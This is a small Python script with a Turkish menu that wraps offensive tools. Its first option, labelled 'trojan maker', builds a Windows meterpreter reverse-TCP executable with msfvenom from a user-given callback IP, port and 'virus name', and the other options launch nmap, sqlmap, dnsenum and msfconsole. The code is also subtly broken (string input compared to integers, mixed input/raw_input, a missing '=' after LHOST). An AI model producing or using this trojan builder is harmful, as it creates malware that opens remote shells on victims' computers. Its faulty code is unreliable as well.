import os 

os.system("clear")

banner="""
------------
𝔚𝔈𝔅ℭ𝔑𝔖
------------
"""
print(banner)

print("""
1)trojan yapıcı
2)nmap vuln scanner
3)sqlmap
4)ip tarama
5)sızmaya hazırlan""")
girdi=input("----->")

if (girdi==1):

     ip=raw_input("cihaz kimligini giriniz:")
     port=raw_input("portu giriniz:")
     ismin=raw_input("virüs ismi:")
     os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)

if (girdi==2):
     os.system("nmap")

if (girdi==3):
     os.system("sqlmap")

if (girdi==4):
     os.system("dnsenum")

if (girdi==5):
     os.system("msfconsole")

